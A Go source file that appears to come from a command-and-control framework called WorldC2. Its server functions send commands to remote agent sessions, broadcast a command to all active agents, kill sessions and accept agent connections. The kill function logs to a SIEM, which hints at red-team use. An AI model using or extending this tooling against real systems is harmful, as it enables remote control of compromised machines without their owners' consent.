package c2

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/siem"
)

// CreateTaskWithContext sends a command to an agent with context for cancellation.
func (s *Server) CreateTaskWithContext(ctx context.Context, agentID, command string, timeoutSec uint32) (*proto.TaskResult, error) {
	var sess *session.Session

	if val, ok := s.sessions.Load(agentID); ok {
		sess = val.(*session.Session)
	} else {
		s.sessions.Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.AgentID == agentID || s.Hostname == agentID || s.ID == agentID {
				sess = s
				return false
			}
			return true
		})
	}

	if sess == nil {
		return nil, fmt.Errorf("agent not found: %s", agentID)
	}
	if !sess.IsActive() {
		return nil, fmt.Errorf("agent not active")
	}

	taskID := generateTaskID()
	task := &proto.Task{TaskId: taskID, Command: command, TimeoutSec: timeoutSec}

	resultCh := sess.RegisterPendingTask(taskID)
	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		sess.ResolveTask(taskID, nil)
		return nil, fmt.Errorf("send: %w", err)
	}

	// Use the smaller of context deadline or task timeout
	taskTimeout := time.Duration(timeoutSec) * time.Second
	if taskTimeout == 0 {
		taskTimeout = 30 * time.Second
	}

	// Create a derived context with the task timeout
	taskCtx, cancel := context.WithTimeout(ctx, taskTimeout)
	defer cancel()

	select {
	case <-taskCtx.Done():
		sess.ResolveTask(taskID, nil)
		if taskCtx.Err() == context.DeadlineExceeded {
			return nil, fmt.Errorf("task timed out")
		}
		return nil, fmt.Errorf("task cancelled: %w", taskCtx.Err())
	case result := <-resultCh:
		if result != nil {
			s.db.UpdateTaskResult(taskID, result.Output, int(result.ExitCode), result.Success)
		}
		return result, nil
	}
}

// BroadcastTaskWithContext sends a command to all active sessions with context.
func (s *Server) BroadcastTaskWithContext(ctx context.Context, command string) map[string]*proto.TaskResult {
	results := make(map[string]*proto.TaskResult)

	s.sessions.Range(func(key, value interface{}) bool {
		select {
		case <-ctx.Done():
			return false // Stop broadcasting if context is cancelled
		default:
		}

		sess := value.(*session.Session)
		if !sess.IsActive() {
			return true
		}

		result, err := s.CreateTaskWithContext(ctx, sess.ID, command, 30)
		if err != nil {
			results[sess.ID] = &proto.TaskResult{TaskId: sess.ID, Success: false, ErrorMessage: err.Error()}
		} else {
			results[sess.ID] = result
		}
		return true
	})

	return results
}

// KillAgentWithContext kills a specific agent session with context.
func (s *Server) KillAgentWithContext(ctx context.Context, agentID string) error {
	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
	}

	val, ok := s.sessions.Load(agentID)
	if !ok {
		return fmt.Errorf("agent not found")
	}
	sess := val.(*session.Session)
	sess.SetState(session.StateKilled)
	sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT, nil)
	sess.Close()
	s.db.UpdateSessionState(sess.ID, "killed")

	s.siem.Forward(siem.SIEMEvent{
		EventType: "agent_killed",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
		},
	})

	return nil
}

// acceptLoopWithContext accepts connections with context for graceful shutdown.
func (s *Server) acceptLoopWithContext(ctx context.Context, listener net.Listener, transportName string) {
	defer s.wg.Done()

	for {
		select {
		case <-ctx.Done():
			listener.Close()
			return
		default:
		}

		// Set a deadline on Accept to allow checking context periodically
		listener.(*net.TCPListener).SetDeadline(time.Now().Add(500 * time.Millisecond))

		conn, err := listener.Accept()
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			select {
			case <-ctx.Done():
				return
			default:
				continue
			}
		}

		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.handleConnection(conn, transportName)
		}()
	}
}
